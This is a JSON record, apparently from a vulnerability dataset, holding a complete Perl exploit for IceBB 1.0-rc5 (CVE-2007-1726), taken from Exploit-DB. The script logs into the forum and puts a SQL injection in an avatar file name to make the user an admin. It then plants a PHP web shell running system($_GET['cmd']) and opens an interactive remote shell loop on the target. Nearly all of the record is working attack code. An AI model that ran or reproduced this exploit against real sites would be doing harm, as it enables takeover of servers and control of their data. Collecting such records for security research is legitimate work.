{
  "id": "3581",
  "title": "IceBB 1.0-rc5 - Remote Code Execution",
  "cve": "CVE-2007-1726",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#  IceBB 1.0-rc5 Remote Code Execution Exploit\r\n#  1. register a user\r\n#  2. run this exploit with this usage : $perl xpl.pl [host&path] [uname] [pass]\r\n#  3. login with admin access :)\r\n#\r\n#\r\n#### Coded & Discovered By Hessam-x / Hessamx-at-Hessamx.net\r\n\r\nuse LWP::UserAgent;\r\nuse HTTP::Cookies;\r\n\r\n$port = \"80\";\r\n $host = $ARGV[0];\r\n $uname = $ARGV[1];\r\n $passwd = $ARGV[2];\r\n $url = \"http://\".$host;\r\n\r\n print q(\r\n ###########################################################\r\n #          IceBB 1.0-rc5 Remote Code Exec Exploit         #\r\n #                    www.Hessamx.Net                      #\r\n ################# (C)oded By Hessam-x #####################\r\n\r\n);\r\n\r\n\r\n if (@ARGV < 3) {\r\n print \" #  usage : xpl.pl [host&path] [uname] [pass]\\n\";\r\n print \" #  e.g : xpl.pl www.milw0rm.com/icebb/ str0ke 123456\\n\";\r\n exit();\r\n }\r\n\r\n   print \" [~] User/Password : $uname/$passwd \\n\";\r\n   print \" [~] Host : $host \\n\";\r\n\r\n $xpl = LWP::UserAgent->new() or die;\r\n $cookie_jar = HTTP::Cookies->new();\r\n\r\n $xpl->cookie_jar( $cookie_jar );\r\n\r\n\r\n$login = $xpl->post($url.'index.php',\r\nContent => [\r\n 'act' => 'login',\r\n'from' => 'index.php',\r\n'user' => $uname,\r\n'pass' => $passwd,\r\n'func' => 'Login',\r\n],);\r\n\r\n if($cookie_jar->as_string =~ /icebb_sessid=(.*?);/) {\r\n       $cookie = $1;\r\n   print \" [~] Logined ...\\n\";\r\n } else {\r\n print \" [-] Can not Login In $host !\\n\";\r\n exit();\r\n }\r\n\r\n $badcode = \"', user_group='1\";\r\n $avata = $xpl->post($url.'index.php',Content_Type => 'form-data',\r\n Content => [\r\n 'avtype'  => 'upload',\r\n 'act' => 'ucp',\r\n 'func' => 'avatar',\r\n 'file'   => [\r\n              undef,\r\n              'avatar.jpg'.$badcode,\r\n              Content_type => 'text/plain',\r\n              Content => 'MYAVATAR',\r\n             ],\r\n 'submit'        => 'Save',\r\n ],\r\n );\r\n $avat = $xpl->post($url.'index.php',Content_Type => 'form-data',\r\n Content => [\r\n 'avtype'  => 'upload',\r\n 'act' => 'ucp',\r\n 'func' => 'avatar',\r\n 'file'   => [\r\n              undef,\r\n              'shell.php'.$badcode,\r\n              Content_type => 'text/plain',\r\n              Content => '<? echo 1 ; echo _START_ ; system(\\$_GET[\\'cmd\\']); echo _END_ ; ?>',\r\n             ],\r\n 'submit'        => 'Save',\r\n ],\r\n );\r\n $test = $xpl->get($url.'index.php');\r\nif($test->as_string =~ /Admin Control Center/) {\r\nprint \" [+] You Are admin Now ! \\n\";\r\n} else {\r\nprint \" [-] Exploit Failed ! \\n\";\r\nexit();\r\n}\r\nif($test->as_string =~ /profile=(.*?)'>/) {\r\n $uid = $1;\r\nprint \" [~] User id : $1 \\n\";\r\n} else {\r\nprint \" [?] please enter user id : \";\r\n     chomp($uid=<STDIN>);\r\n}\r\n\r\n   while ()\r\n{\r\n     print \"\\n[Shell - type 'exit' for exit]\\$ \";\r\n     chomp($exc=<STDIN>);\r\n    &sys($exc);\r\n}\r\nsub sys($exc) {\r\n     if ($exc eq 'exit') { exit() ; }\r\n $res = $xpl->get($url.'uploads/av-'.$uid.'.php?cmd='.$exc);\r\n @result = split(/\\n/,$res->content);\r\n $runned = 0;\r\n $on = 0;\r\n for $res(@result) {\r\n   if ($res =~ /^_END_/) { print \"\\n\"; return 0; }\r\n   if ($on == 0) { print \"  $res\\n\"; }\r\n   if ($res =~ /^_START_/) { $on = 1; $runned = 1; }\r\n }\r\n   if (!$runned) { print \"\\n Can not execute command . EXPLOIT FAILED !\\n\" ; exit(); };\r\n\r\n }\r\n\r\n\r\nprint \"\\n #################################################### \\n\";\r\n\r\n# milw0rm.com [2007-03-26]",
  "url": "https://www.exploit-db.com/exploits/3581"
}